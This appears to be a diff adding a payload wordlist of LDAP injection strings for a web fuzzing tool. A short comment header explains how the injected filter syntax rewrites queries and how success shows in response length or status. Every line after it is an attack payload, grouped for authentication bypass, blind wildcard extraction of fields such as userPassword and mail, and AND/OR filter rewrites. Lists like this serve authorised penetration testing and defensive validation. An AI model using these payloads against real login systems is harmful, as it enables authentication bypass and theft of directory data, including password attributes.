@@ -1,0 +1,37 @@
+# ==================================================================
+#  LDAP INJECTION PAYLOADS (single file)
+#  One payload per line. "#" lines are comments (pyintruder skips them).
+#  LDAP filters look like (&(uid=X)(userPassword=Y)). You inject filter syntax
+#  ( ) * | & to rewrite the logic. Detection is BEHAVIOURAL: auth bypass -> login
+#  OK / more results (watch response LENGTH/STATUS). '&' is written %26 so it
+#  transmits raw (server decodes it back to '&').
+# ==================================================================
+
+# ---- 0. CANARY / detection — auth bypass (login OK / more results) ----
+*
+*)(uid=*))(|(uid=*
+
+# ---- 1. Auth bypass ----
+*)(%26)
+*))%00
+admin)(%26)
+admin*)((|userPassword=*)
+*)(|(password=*))
+*)(|(objectClass=*))
+*)(uid=*
+)(cn=*
+*)((|
+admin*
+*)(%26(uid=*))
+
+# ---- 2. Wildcards / blind extraction ----
+a*
+*)(mail=*)
+*)(uid=a*
+*)(userPassword=a*
+admin)(|(uid=*
+
+# ---- 3. AND/OR logic rewrites ----
+*)(|(cn=*))
+x)(|(cn=*
+*)(%26(objectClass=*)
